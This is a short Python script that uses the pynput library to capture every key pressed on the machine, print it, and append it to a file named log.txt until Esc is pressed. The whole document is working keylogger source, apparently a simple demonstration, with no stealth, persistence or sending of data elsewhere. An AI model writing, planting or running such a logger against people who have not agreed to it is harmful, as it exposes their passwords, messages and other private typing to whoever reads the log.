from pynput.keyboard import Key, Listener


def on_press(key):
    print("{0} pressed".format(key)) #only to show what we store in the file
    write_file(key)


def write_file(key):
    with open("log.txt", "a") as f:
        k = str(key).replace("'", "")
        
        if k.find("space") > 0:
            f.write('\n')
        else:
            f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
